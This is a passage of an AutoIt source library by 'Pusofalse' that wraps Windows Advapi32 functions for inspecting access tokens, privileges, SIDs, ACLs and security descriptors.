; Parameter(s)	: $hToken	- Handle to the access token.
; Return values	: If succeeds, returns the user of the token, in string format, else returns NULL and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _GetTokenUser($hToken)
	Local $pBuffer, $tBuffer, $iSysError, $pSid, $sUser, $iAttr

	$pBuffer = _GetTokenInformation($hToken, 1)
	$iSysError = @error
	$tBuffer = DllStructCreate("ptr;dword", $pBuffer)
	$pSid = DllStructGetData($tBuffer, 1)
	$sUser = _LookupAccountSid($pSid)
	$iAttr = DllStructGetData($tBuffer, 2)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, $iAttr, $sUser)
EndFunc	;==>_GetTokenUser

; #### FUNCTION ####
; =======================================================================
; This function is only internal used, frees the variable with the type of DLL structure, array, object...
; =======================================================================
Func _FreeVariable(ByRef $vVariable, $vValue = 0, $vReturn = "", $iError = @error, $iExtended = @extended)
	$vVariable = $vValue
	Return SetError($iError, $iExtended, $vReturn)
EndFunc	;==>_FreeVariable

; #### FUNCTION ####
; =======================================================================
; Name	: _GetTokenPrivileges
; Description	: Returns an array contains the token's privilege information.
; Parameter	: $hToken	- Handle to the token.
; Return values	: An array with following format:
;		:	- $aArray[0][0] - The number of privileges returned.
;		:	- $aArray[1][0] - The first privilege's name.
;		:	- $aArray[1][1] - The first privilege's display name.
;		:	- $aArray[1][2] - The first privilege's attribute. 0 indicates disabled, 2 indicates enabled, 3 indicates default-enabled.
;		:	- ... ...
; Author	: Pusofalse
; =======================================================================
Func _GetTokenPrivileges($hToken)
	Local $tBuffer, $pBuffer, $tagBuffer, $iSysError, $tNum, $aResult[1][3]

	If $hToken = 0 Then Return SetError(6, 0, $aResult)
	$pBuffer = _GetTokenInformation($hToken, 3)
	$iSysError = @error
	$tNum = DllStructCreate("dword", $pBuffer)
	$aResult[0][0] = DllStructGetData($tNum, 1)
	Redim $aResult[$aResult[0][0] + 1][3]
	For $i = 1 to $aResult[0][0]
		$tagBuffer &= ";dword;long;dword"
	Next
	$tBuffer = DllStructCreate("dword" & $tagBuffer, $pBuffer)
	For $i = 1 to $aResult[0][0]
		$aResult[$i][0] = _LookupPrivilegeName(DllStructGetData($tBuffer, ($i - 1) * 3 + 2))
		$aResult[$i][1] = _LookupPrivilegeDisplayName($aResult[$i][0])
		$aResult[$i][2] = DllStructGetData($tBuffer, ($i - 1) * 3 + 4)
	Next
	_HeapFree($pBuffer)
	_FreeVariable($tNum)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, 0, $aResult)
EndFunc	;==>_GetTokenPrivileges

Func _GetTokenSource($hToken)
	Local $pBuffer, $tBuffer, $sSource, $iLuid, $iSysError

	$pBuffer = _GetTokenInformation($hToken, 7)
	$iSysError = @error
	$tBuffer = DllStructCreate("char SrcName[8];" & $tagLUID, $pBuffer)
	$sSource = DllStructGetData($tBuffer, "SrcName")
	$iLuid = DllStructGetData($tBuffer, "Low")
	_HeapFree($pBuffer)
	_FreeVariable($tBuffer)
	Return SetError($iSysError, $iLuid, $sSource)
EndFunc	;==>_GetTokenSource

Func _GetTokenStatistics($hToken)
	Local $tBuffer, $pBuffer, $aResult[10], $iSysError

	$pBuffer = _GetTokenInformation($hToken, 10)
	$tBuffer = DllStructCreate($tagTOKENSTATISTICS, $pBuffer)
	$iSysError = @error
	$aResult[0] = DllStructGetData($tBuffer, "TokenId")
	$aResult[1] = DllStructGetData($tBuffer, "AuthenticationId")
	$aResult[2] = DllStructGetData($tBuffer, "ExpirationTime")
	$aResult[3] = DllStructGetData($tBuffer, "TokenType")
	$aResult[4] = DllStructGetData($tBuffer, "ImpersonationLevel")
	$aResult[5] = DllStructGetData($tBuffer, "DynamicCharged")
	$aResult[6] = DllStructGetData($tBuffer, "DynamicAvalable")
	$aResult[7] = DllStructGetData($tBuffer, "GroupCount")
	$aResult[8] = DllStructGetData($tBuffer, "PrivilegeCount")
	$aResult[9] = DllStructGetData($tBuffer, "ModifiedId")
	_HeapFree($pBuffer)
	Return SetError($iSysError, _FreeVariable($tBuffer), $aResult)
EndFunc	;==>_GetTokenStatistics

; #### FUNCTION ####
; =======================================================================
; Name	: _LookupPrivilegeName
; Description	: Retrieves the name of privilege by using the given LUID.
; Parameter(s)	: $iLow	- The value in low part of the LUID.
;		: $iHigh	- The value in high part of the LUID.
;		: $sSystem	- System name on which the function executes, default to local.
; Return values	: If succeeds, returns a string contains the privilege name.
; Author	: Pusofalse
; =======================================================================
Func _LookupPrivilegeName($iLow, $iHigh = 0, $sSystem = "")
	Local $pLuid, $iResult

	$pLuid = _InitializeLuid($iLow, $iHigh)
	$iResult = DllCall("Advapi32.dll", "int", "LookupPrivilegeName", _
			"str", $sSystem, "ptr", $pLuid, "str", "", "int*", 0)
	$iResult = DllCall("Advapi32.dll", "int", "LookupPrivilegeName", _
			"str", $sSystem, "ptr", $pLuid, "str", "", "int*", $iResult[4])
	Return SetError(_GetLastError(), _HeapFree($pLuid), $iResult[3])
EndFunc	;==>_LookupPrivilegeName

; #### FUNCTION ####
; =======================================================================
; Name	: _LookupPrivilegeDisplayName
; Description	: Retrieves the display name of the privilege by using the privilege name.
; Parameter(s)	: $sName	- The name of the privilege.
;		: $sSystem	- System name on which the function executes, default is local system.
; Return values	: If succeeds, returns a string contains the privilege's display name, else returns NULL and sets @error.
; Author	: Pusofalse
; =======================================================================
Func _LookupPrivilegeDisplayName($sName, $sSystem = "")
	Local $iResult

	$iResult = DllCall("Advapi32.dll", "int", "LookupPrivilegeDisplayName", _
			"str", $sSystem, "str", $sName, "str", "", _
			"dword*", 0, "dword*", 0)
	$iResult = DllCall("Advapi32.dll", "int", "LookupPrivilegeDisplayName", _
			"str", $sSystem, "str", $sName, "str", "", _
			"dword*", $iResult[4] * 2, "dword*", 0)
	Return SetError(_GetLastError(), 0, $iResult[3])
EndFunc	;==>_LookupPrivilegeDisplayName

; #### FUNCTION ####
; =======================================================================
; Name	: _LookupPrivilegeValue
; Description	: Retrieves the local unique identifier of the privilege.
; Parameter(s)	: $sName	- Privilege's name.
;		: $sSystem	- Specifies the system on which the function executes, default to local.
; Return values	: If succeeds, returns a pointer to a LUID structure, contains the LUID of the specified privilege.
; Author	: Pusofalse
; Remarks	: When you finished with the LUID pointer, call _HeapFree function to free it.
; =======================================================================
Func _LookupPrivilegeValue($sName, $sSystem = "")
	Local $pLuid, $iResult

	$pLuid = _InitializeLuid(0)
	$iResult = DllCall("Advapi32.dll", "int", "LookupPrivilegeValue", _
			"str", $sSystem, "str", $sName, "ptr", $pLuid)
	Return SetError(_GetLastError(), $iResult[0], $pLuid)
EndFunc	;==>_LookupPrivilegeValue

; #### FUNCTION ####
; =======================================================================
; Name	: _InitializeLuid
; Description	: This function initializes a LUID structure.
; Parameter(s)	: $iLowPart	- The value in low part of LUID.
;		: $iHighPart	- The value in high part of LUID.
; Return values	: A pointer to a LUID structure.
; Author	: Pusofalse
; Remarks	: When you finished with this LUID pointer, call _HeapFree function to free it.
; =======================================================================
Func _InitializeLuid($iLowPart, $iHighPart = 0)
	Local $pLuid, $tLuid

	$pLuid = _HeapAlloc(8)
	$tLuid = DllStructCreate($tagLUID, $pLuid)
	DllStructSetData($tLuid, "Low", $iLowPart)
	DllStructSetData($tLuid, "High", $iHighPart)
	Return $pLuid
EndFunc	;==>_InitializeLuid

; #### FUNCTION ####
; =======================================================================
; Name	: _IsTokenRestricted
; Description	: Determines the token whether is a restricted token or not.
; Parameter(s)	: $hToken	- Handle to the access token to determine.
; Return values	: True indicates the token is a restricted token, false otherwise.
; Author	: Pusofalse
; =======================================================================
Func _IsTokenRestricted($hToken)
	Local $iResult = DllCall("Advapi32.dll", "int", "IsTokenRestricted", "hWnd", $hToken)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_IsTokenRestricted

; #### FUNCTION ####
; =======================================================================
; Name	: _IsValidAcl
; Description	: Validates an access control list.
; Parameter(s)	: $pAcl	- A pointer to an access control list, either a DACL or a SACL.
; Return values	: If $pAcl is a valid access control list pointer, returns true, otherwise returns false, in this case to sets @error to ERROR_INVALID_ACL.
; Author	: Pusofalse
; =======================================================================
Func _IsValidAcl($pAcl)
	Local $iResult = DllCall("Advapi32.dll", "int", "IsValidAcl", "ptr", $pAcl)
	If $iResult[0] Then Return SetError(0, 0, True)
	Return SetError($ERROR_INVALID_ACL, 0, False)
EndFunc	;==>_IsValidAcl

; #### FUNCTION ####
; =======================================================================
; Name	: _IsValidSid
; Description	: Validate a pointer to a SID.
; Parameter(s)	: $pSid	- A pointer to a SID structure.
; Return values	: If $pSid is a valid SID pointer, returns true, otherwise returns false, in the case to set @error to ERROR_INVALID_SID.
; Author	: Pusofalse
; =======================================================================
Func _IsValidSid($pSid)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "int", "IsValidSid", "ptr", $pSid)
	If $iResult[0] Then Return SetError(0, 0, True)
	Return SetError($ERROR_INVALID_SID, 0, False)
EndFunc	;==>_IsValidSid

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSidIdentifierAuthority
; Description	: Retrieves the authority of the SID.
; Parameter(s)	: $pSid	- A pointer to a SID.
; Return values	: Returns the authority, in string format if succeeds; else returns NULL and sets @error to ERROR_INVALID_SID.
; Author	: Pusofalse
; =======================================================================
Func _GetSidIdentifierAuthority($pSid)
	Local $iResult, $tBuffer, $iAuty, $sAuty
	Local $aAuty[10] = ["NULL", "WORLD", "LOCAL", "CREATOR", "NON UNIQUE", "NT", "UNKNOWN", "UNKNOWN", "UNKNOWN", "RESOURCE MANAGER"]

	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, "")
	$iResult = DllCall("Advapi32.dll", "ptr", "GetSidIdentifierAuthority", "ptr", $pSid)
	$tBuffer = DllStructCreate($tagSIDIDENTIFIERAUTHORITY, $iResult[0])
	$iAuty = DllStructGetData($tBuffer, "Authority")
	_FreeVariable($tBuffer)
	Return SetExtended($iAuty, $aAuty[$iAuty] & " SID AUTHORITY")
EndFunc	;==>_GetSidIdentifierAuthority

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSidSubAuthorityCount
; Description	: Retrieves the number of the sub-authorities of the SID.
; Parameter(s)	: $pSid	- A pointer to a SID.
; Return values	: If succeeds, returns the number of the sub-authorities of the SID.
; Author	: Pusofalse
; =======================================================================
Func _GetSidSubAuthorityCount($pSid)
	Local $iResult, $tCount, $iCount

	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "ptr", "GetSidSubAuthorityCount", "ptr", $pSid)
	$tCount = DllStructCreate("byte Count", $iResult[0])
	$iCount = DllStructGetData($tCount, "Count")
	Return SetExtended(_FreeVariable($tCount), $iCount)
EndFunc	;==>_GetSidSubAuthorityCount

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSidSubAuthority
; Description	: This function queries the sub-authority of the SID.
; Parameter(s)	: $pSid	- A pointer to a SID.
;		: $iIndex	- Zero-based index of the authority which to query.
; Return values	: If succeeds, returns the specified sub-authority of the SID.
; Author	: Pusofalse
; =======================================================================
Func _GetSidSubAuthority($pSid, $iIndex)
	Local $iResult, $tSubAuthority, $iSubAuthority

	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "ptr", "GetSidSubAuthority", _
			"ptr", $pSid, "dword", $iIndex)
	$tSubAuthority = DllStructCreate("dword SubAuthority", $iResult[0])
	$iSubAuthority = DllStructGetData($tSubAuthority, "SubAuthority")
	Return SetExtended(_FreeVariable($tSubAuthority), $iSubAuthority)
EndFunc	;==>_GetSidSubAuthority

; #### FUNCTION ####
; =======================================================================
; Name	: _IsWellKnownSid
; Description	: Determines the SID whether is a well-known SID or not.
; Parameter(s)	: $pSid	- A pointer to a SID to validate.
;		: $iType	- The type of the SID to determine, or -1, in which case, the function sets @extended to the type of the SID.
; Return values	: If $pSid is a well-known SID, returns true, if $iType is set to -1 by the caller, the @extended is set to the type of the SID. If $pSid is not a well-known SID, returns false. If $pSid is not a valid SID, returns zero also and sets @error to ERROR_INVALID_SID.
; Author	: Pusofalse
; =======================================================================
Func _IsWellKnownSid($pSid, $iType)
	Local $iResult

	If Not _IsValidSid($pSid) Then Return SetError(@error, -1, 0)
	If $iType = -1 Then
		For $i = 0 to 78
			$iResult = DllCall("Advapi32.dll", "int", "IsWellKnownSid", "ptr", $pSid, "int", $i)
			If $iResult[0] Then Return SetError(_GetLastError(), $i, 1)
		Next
		Return False
	Else
		$iResult = DllCall("Advapi32.dll", "int", "IsWellKnownSid", "ptr", $pSid, "int", $iType)
		Return $iResult[0] <> 0
	EndIf
EndFunc	;==>_IsWellKnownSid

; #### FUNCTION ####
; =======================================================================
; Name	: _GetLengthSid
; Description	: Retrieve the length of the SID.
; Parameter(s)	: $pSid	- A pointer to SID from which the length is retrieved.
; Return values	: If succeeds, returns the length of the SID. If $pSid isn't a valid SID pointer, returns zero and sets @error to ERROR_INVALID_SID.
; Author	: Pusofalse
; =======================================================================
Func _GetLengthSid($pSid)
	Local $iResult
	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "dword", "GetLengthSid", "ptr", $pSid)
	Return $iResult[0]
EndFunc	;==>_GetLengthSid

; #### FUNCTION ####
; =======================================================================
; Name	: _CopySid
; Description	: This function duplicates a SID pointer.
; Parameter(s)	: $pSid	- A pointer to a SID structure.
; Return values	: If succeeds, return the pointer to the new copied SID, else sets @error to a system error code.
; Author	: Pusofalse
; Remarks	: When you finished with this new copied SID, call _HeapFree function to free it.
; =======================================================================
Func _CopySid($pSid)
	Local $pNewSid, $iResult, $iLength

	If Not _IsValidSid($pSid) Then Return SetError(@error, 0, 0)
	$iLength = _GetLengthSid($pSid)
	$pNewSid = _HeapAlloc($iLength)
	$iResult = DllCall("Advapi32.dll", "int", "CopySid", "dword", $iLength, _
			"ptr", $pNewSid, "ptr", $pSid)
	Return SetError(_GetLastError(), 0, $pNewSid)
EndFunc	;==>_CopySid

; #### FUNCTION ####
; =======================================================================
; Name	: _IsValidSecurityDescriptor
; Description	: Validates a security descriptor.
; Parameter(s)	: $pSecurDesc	- A pointer to a security descriptor.
; Return values	: If $pSecurDesc is a valid security descriptor, returns true, else returns false and sets @error to ERROR_INVALID_SECURITY_DESCR.
; Author	: Pusofalse
; =======================================================================
Func _IsValidSecurityDescriptor($pSecurDesc)
	Local $iResult = DllCall("Advapi32.dll", "int", "IsValidSecurityDescriptor", "ptr", $pSecurDesc)
	If $iResult[0] Then Return SetError(0, 0, True)
	Return SetError($ERROR_INVALID_SECURITY_DESCR, 0, False)
EndFunc	;==>_IsValidSecurityDescriptor

; #### FUNCTION ####
; =======================================================================
; Name	: _InitializeAcl
; Description	: This function initializes an access control list.
; Parameter(s)	: $pAcl	- A pointer to an access control list.
;		: $iAclSize	- The size of the $pAcl.
;		: $iRevision	- The revision level of the ACL structure being created, default is ACL_REVISION.
; Return values	: True indicates success, false indicates failure.
; Author	: Pusofalse
; =======================================================================
Func _InitializeAcl($pAcl, $iAclSize, $iRevision = 2)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "int", "InitializeAcl", _
			"ptr", $pAcl, "int", $iAclSize, "int", $iRevision)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_InitializeAcl

; #### FUNCTION ####
; =======================================================================
; Name	: _InitializeSecurityDescriptor
; Description	: Initializes a new security descriptor.
; Parameter(s)	: $iLength	 - The length of the security descriptor, the minimum length is 20 bytes.
; Return values	: If succeeds, returns the pointer to the new security descriptor, else sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _InitializeSecurityDescriptor($iLength = 20)
	If $iLength < 20 Then $iLength = 20

	Local $pSecurDesc = _HeapAlloc($iLength), $iResult
	$iResult = DllCall("Advapi32.dll", "int", "InitializeSecurityDescriptor", _
			"ptr", $pSecurDesc, "dword", 1)
	Return SetError(_GetLastError(), $iResult, $pSecurDesc)
EndFunc	;==>_InitializeSecurityDescriptor

; #### FUNCTION ####
; =======================================================================
; Name	: _GetNamedSecurityInfo
; Description	: Retrieves the security information of the specified securable object.
; Parameter(s)	: $sObject	- The name the object, in string format, can be a file, registry key, service, share resource, event, user object and so on.
;		: $iType	- The type of the object, if the $sObject is a file, this parameter must set to SE_FILE_OBJECT. For more options, see SECURITY OBJECT TYPE CONSTANTS.
;		: $iSecurLevel	- Specifies the security information to be retrieved. can be one or more of the following values:
;		:	- $OWNER_SECURITY_INFORMATION (1) - Retrieve the owner information of the object.
;		:	- $GROUP_SECURITY_INFORMATION (2) - Retrieve the primary group of the object.
;		:	- $DACL_SECURITY_INFORMATION (4) - Retrieve the DACL information of the object.
;		:	- $SACL_SECURITY_INFORMATION (8) - Retrieve the SACL information of the object.
; Return values	: Returns an array with following format:
;		:	- $aArray[0] - A DWORD value indicates the success or failure of the call to this function, zero indicates success.
;		:	- $aArray[1] - The name of the object, same to $sObject parameter.
;		:	- $aArray[2] - The type of the object, same to $iType parameter.
;		:	- $aArray[3] - The security information requested, same to $iSecurLevel parameter.
;		:	- $aArray[4] - The owner of the object, if OWNER_SECURITY_INFORMATION is not specified in $iSecurLevel parameter, this value is zero.
;		:	- $aArray[5] - The primary group of the object, if $iSecurLevel does not contains the GROUP_SECURITY_INFORMATION, this value is zero.
;		:	- $aArray[6] - The DACL of the object, if $iSecurLevel does not contains the DACL_SECURITY_INFORMATION, this value is 0.
;		:	- $aArray[7] - The SACL of the object, if $iSecurLevel doest not contains the SACL_SECURITY_INFORMATION, this value is 0.
;		:	- $aArray[8] - A pointer to security descriptor that contains the security information of the object.
; Author	: Pusofalse
; Remarks	: If SACL_SECURITY_INFORMATION is specified in $iSecurLevel parameter, the caller must have the SE_SECURITY_NAME privilege enabled, to enable this privilege, call _AdjustTokenPrivileges function. The $iSecurLevel must not be zero.
; =======================================================================
Func _GetNamedSecurityInfo($sObject, $iType, $iSecurLevel = 4)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "dword", "GetNamedSecurityInfo", _
			"str", $sObject, "int", $iType, "int", $iSecurLevel, _
			"ptr*", 0, "ptr*", 0, "ptr*", 0, "ptr*", 0, "ptr*", 0)
	Return $iResult
EndFunc	;==>_GetNamedSecurityInfo

; #### FUNCTION ####
; =======================================================================
; Name	: _SetNamedSecurityInfo
; Description	: Sets the security information for the specified object.
; Parameter(s)	: $sObject	- The name of the object, in string format, can be a name of a file, service, registry key, share resource, event, and so on.
;		: $iType	- The type of the object. If $sObject is a service name, this value must set to SE_SERVICE, for more options, see SECURITY OBJECT TYPE CONSTANTS.
;		: $iSecurLevel	- Specifies the security information to be set, can be one or more of the following values:
;		:	- $OWNER_SECURITY_INFORMATION (1) - $pOwner is valid, contains the owner the object.
;		:	- $GROUP_SECURITY_INFORMATION (2) - $pGroup is valid, contains the primary group of the object.
;		:	- $DACL_SECURITY_INFORMATION (4) - $pDacl is valid, contains the DACL of the object.
;		:	- $SACL_SECURITY_INFORMATION (8) - $pSacl is valid, contains the SACL of the object.
;		; $pOwner	- The owner of the object, if OWNER_SECURITY_INFORMATION is not specified in $iSecurLevel parameter, this parameter is ignored.
;		: $pGroup	- The primary group of the object, if GROUP_SECURITY_INFORMATION is not specified in $iSecurLevel parameter, this value is ignored.
;		: $pDacl	- The DACL of the object, if DACL_SECURITY_INFORMATION is not specified in $iSecurLevel, this value is ignored.
;		: $pSacl	- The SACL of the object, if SACL_SECURITY_INFORMATION is not specified, this parameter can be zero.
; Return values	: True indicates success, false to failure, in this case to set @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetNamedSecurityInfo($sObject, $iType, $iSecurLevel, $pOwner, $pGroup, $pDacl, $pSacl)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "dword", "SetNamedSecurityInfo", _
			"str", $sObject, "int", $iType, "int", $iSecurLevel, _
			"ptr", $pOwner, "ptr", $pGroup, _
			"ptr", $pDacl, "ptr", $pSacl)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_SetNamedSecurityInfo

#### FUNCTION ####
; =======================================================================
; Name	: _GetAclInformation
; Description	: This function retrieves the informaton about an access control list.
; Parameter(s)	: $pAcl	- A pointer to an access control list.
; Return values	: If succeeds, @extended is set to number of access control entries, the low order word of return value is set to the number of bytes that is in use of ACL, high order word of return value is set to the number of bytes that is in unuse of ACL. If fails, returns zero and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _GetAclInformation($pAcl)
	Local $tAclSize, $pAclSize, $aResult[3], $iResult, $iSysError

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	$tAclSize = DllStructCreate($tagACLSIZEINFO)
	$pAclSize = DllStructGetPtr($tAclSize)
	$iResult = DllCall("Advapi32.dll", "int", "GetAclInformation", _
			"ptr", $pAcl, "ptr", $pAclSize, "int", 12, "int", 2)
	$iSysError = _GetLastError()
	$aResult[0] = DllStructGetData($tAclSize, "AceCount")
	$aResult[1] = DllStructGetData($tAclSize, "BytesInUse")
	$aResult[2] = DllStructGetData($tAclSize, "BytesFree")
	_FreeVariable($tAclSize)
	$iResult = bitOR(bitAND($aResult[1], 0xFFFF), bitShift($aResult[2], -16))
	Return SetError($iSysError, $aResult[0], $iResult)
EndFunc	;==>_GetAclInformation

; =======================================================================
; Bad function, do not use it. 
; =======================================================================
Func _CombineAcl(ByRef $pAcl1, ByRef $pAcl2)
	Local $pNewAcl, $iNumofAce

	If Not _IsValidAcl($pAcl1) Then Return SetError(@error, 1, 0)
	If Not _IsValidAcl($pAcl2) Then Return SetError(@error, 2, 0)

	$iNumOfAce = _GetExplicitEntriesFromAcl($pAcl2)
	$iNumOfAce = $iNumOfAce[0][0]
	If $iNumOfAce = 0 Then Return SetError(0, 0, $pAcl1)

	For $i = 0 to $iNumOfAce - 1
		_AddAce($pAcl1, _GetAce($pAcl2, $i))
	Next
	Return 1
EndFunc	;==>_CombineAcl

; =======================================================================
; Bad function, do not use it. 
; =======================================================================
Func _DuplicateAcl(ByRef $pAcl, $fTrimSize = True)
	Local $pNewAcl, $iSize, $iNum

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, 0)
	$iSize = _GetAclInformation($pAcl)
	$iNum = _GetExplicitEntriesFromAcl($pAcl)
	$iNum = $iNum[0][0]
	If $fTrimSize = True Then
		$iSize = bitAND($iSize, 0xFFFF)
	Else
		$iSize = bitAND($iSize, 0xFFFF) + bitShift($iSize, 0x10)
	EndIf
	$pNewAcl = _HeapAlloc($iSize)
	_InitializeAcl($pNewAcl, $iSize)
	For $i = $iNum - 1 to 0 Step - 1
		_AddAce($pNewAcl, _GetAce($pAcl, $i))
	Next
	Return SetError(@error, 0, $pNewAcl)
EndFunc	;==>_DuplicateAcl

; #### FUNCTION ####
; =======================================================================
; Name	: _GetExplicitEntriesFromAcl
; Description	: Retrieves an array contains the data described as the access control entry (ACE) in an access control list (ACL).
; Parameter(s)	: $pAcl	- A pointer to an access control list.
; Return values	: If succeeds, returns an array with following format:
;		:	- $aArray[0][0] - The number of ACE returned.
;		:	- $aArray[1][0] - The owner of the first ACE.
;		:	- $aArray[1][1] - The SID string of the owner in first ACE.
;		:	- $aArray[1][2] - The access mask value assigned to the first owner.
;		:	- $aArray[1][3] - The access mode, DENY_ACCESS and GRANT_ACCESS are defined in DACL.
;		:	- $aArray[1][4] - The inheritance options, see INHERITANCE CONTANTS for possible values.
;		:	- ... ...
;		: If fails, the value of $aArray[0][0] is set to zero, and sets @error to a system error code.
; Author	: Pusofalse
; Remarks		: If $pAcl is a NULL ACL pointer, the value of $aArray[0][0] and @error are both set to zero. 
; =======================================================================
Func _GetExplicitEntriesFromAcl($pAcl)
	Local $iResult, $aResult[1][5] = [[0]], $tagBuffer, $tBuffer, $vTemp

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, $aResult)
	$iResult = DllCall("Advapi32.dll", "dword", "GetExplicitEntriesFromAcl", _
			"ptr", $pAcl, "ulong*", 0, "ptr*", 0)
	$aResult[0][0] = $iResult[2]
	Redim $aResult[$iResult[2] + 1][5]
	For $i = 1 to $iResult[2]
		$tagBuffer &= "dword[3];ptr;int[3];ptr;"
	Next
	$tBuffer = DllStructCreate($tagBuffer, $iResult[3])
	For $i = 1 to $iResult[2]
		$vTemp = DllStructGetData($tBuffer, ($i - 1) * 4 + 3, 2)
		$aResult[$i][0] = DllStructGetData($tBuffer, ($i - 1) * 4 + 4)
		If $vTemp = $TRUSTEE_IS_SID Then
			$pSid = _CopySid($aResult[$i][0])
			$aResult[$i][0] = _LookupAccountSid($pSid)
			$aResult[$i][1] = _ConvertSidToStringSid($pSid)
			_HeapFree($pSid)
		ElseIf $vTemp = $TRUSTEE_IS_NAME Then
			$tTemp = DllStructCreate("char[256]", $aResult[$i][0])
			$aResult[$i][0] = DllStructGetData($tTemp, 1)
			$pSid = _LookupAccountName($aResult[$i][0])
			$aResult[$i][1] = _ConvertSidToStringSid($pSid)
			_FreeVariable($tTemp)
			_HeapFree($pSid)
		Else
			$aResult[$i][1] = $vTemp
		EndIf
		$aResult[$i][2] = "0x" & Hex(DllStructGetData($tBuffer, ($i - 1) * 4 + 1, 1))
		$aResult[$i][3] = DllStructGetData($tBuffer, ($i - 1) * 4 + 1, 2)
		$aResult[$i][4] = DllStructGetData($tBuffer, ($i - 1) * 4 + 1, 3)
	Next
	_FreeVariable($tBuffer)
	_LsaLocalFree($iResult[3])
	Return SetError($iResult[0], 0, $aResult)
EndFunc	;==>_GetExplicitEntriesFromAcl

; #### FUNCTION ####
; =======================================================================
; Name	: _GetExplicitEntriesFromAcl1
; Description	: Retrieve the ACE information from an access control list (ACL).
; Parameter(s)	: $pAcl	- A pointer to an access control list from which the ACEs is retrieved.
; Return values	: An array with following format:
;		: - $aArray[0][0]	- The number of the returned ACEs.
;		: - $aArray[1][0]	- The trustee of the first entry.
;		: - $aArray[1][1]	- The SID (in string format) of the first trustee.
;		: - $aArray[1][2]	- Access mask.
;		: - $aArray[1][3]	- Access type specified for the first trustee. ACCESS_ALLOWED_ACE_TYPE (0) indicates the ACE is an allowed-ace, ACCESS_DENIED_ACE_TYPE (1) indicates the ACE is an denied-ace. SYSTEM_ALARM_ACE_TYPE is for a system-audit ace.
;		: - $aArray[1][4]	- Access flags (inheritance options).
;		: - ... ...
; Author	: Pusofalse
; Remarks	: If $pAcl is a NULL-ACL, the values of $aArray[0][0] and @error are set to zero. The diversity between this function and _GetExplicitEntriesFromAcl function is that, if one ACE is inherited from its parent object, _GetExplicitEntriesFromAcl function does not return this ACE (in other words, _GetExplicitEntriesFromAcl function can only return the non-inherited ACE). This function returns all ACEs.
; =======================================================================
Func _GetExplicitEntriesFromAcl1(ByRef $pAcl)
	Local $aResult[1][5] = [[0]], $pSid, $tAccessAce, $pAce

	If Not _IsValidAcl($pAcl) Then Return SetError(@error, 0, $aResult)
	_GetAclInformation($pAcl)
	$aResult[0][0] = @extended
	If $aResult[0][0] = 0 Then Return SetError(@error, 0, $aResult)
	Redim $aResult[$aResult[0][0] + 1][5]

	For $i = 1 to $aResult[0][0]
		$pAce = _GetAce($pAcl, $i - 1)
		$tAccessAce = DllStructCreate($tagACCESSACE, $pAce)
		$pSid = _CopySid(DllStructGetPtr($tAccessAce, "SidStart"))
		$aResult[$i][0] = _LookupAccountSid($pSid)
		$aResult[$i][1] = _ConvertSidToStringSid($pSid)
		$aResult[$i][2] = "0x" & Hex(DllStructGetData($tAccessAce, "AccessMask"))
		$aResult[$i][3] = DllStructGetData($tAccessAce, "AceType")
		$aResult[$i][4] = DllStructGetData($tAccessAce, "AceFlags")
		_HeapFree($pSid)
	Next
	Return $aResult
EndFunc	;==>_GetExplicitEntriesFromAcl1

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalFree
; Parameter(s)	: $pMem	- A pointer to a block of memory.
; Return values	: True indicates success, false to failure.
; Author	: Pusofalse
; Remarks	: _SetEntriesInAcl or other functions return this $pMem parameter.
; =======================================================================
Func _LsaLocalFree($pMem)
	Local $iResult
	$iResult = DllCall("Kernel32.dll", "int", "LocalFree", "ptr", $pMem)
	Return $iResult[0] <> $pMem
EndFunc	;==>_LsaLocalFree

; #### FUNCTION ####
; =======================================================================
; Name	: _BuildSecurityDescriptor
; Description	: This function initializes a security descriptor structure.
; Parameters	: $sOwner	- The name of the owner of this security descriptor, can be blank.
;		: $sGroup	- The primary group name of this security descriptor, can be blank.
;		: $aAccess	- The DACL security information for this security descriptor, can be zero.
;		: $aAudit		- The SACL security information for this security descriptor, can be zero.
;		: $pOldSd		- Specify an exising pointer to a self-relative security descriptor, if non-zero, in which case, the function builds the new security descriptor by merging the specified owner, group, access control, and audit-control information with the information in this security descriptor. This parameter can NULL.
; Return values	: If succeeds, the return value is a pointer to a new security descriptor contains the security data you specified, otherwise, the value is set to zero, and @error is set to ERROR_INVALID_PARAMETER, and @extended is set to:
;		: If $aAccess parameter contains invalid data, @extended is set to 1.
;		: If $aAudit parameter contains invalid data, @extended is set to 2.
;		: If $sOwner is non-null, and it is an invalid owner, @extended is set to 3.
;		: If $sGroup is non-null, and it is an invalid primary group, @extended is set to 4.
;		: If $pOldSd is non-zero, and it is an invalid security descriptor, @extended is set to 5.
; Author		: Pusofalse
; Remarks		: For the format of $aAccess and $aAudit parameter can only be token, see _SetEntriesInAcl function's PARAMETERS section. When you no longer use the pointer to the new security descriptor, call _LsaLocalFree function to free it.
; =======================================================================
Func _BuildSecurityDescriptor($sOwner, $sGroup, $aAccess, $aAudit, $pOldSd = 0)
	Local $iResult, $pOwner, $pGroup, $pDacl, $pSacl

	If IsArray($aAccess) Then $pDacl = _InitializeExplicitAccess($aAccess)
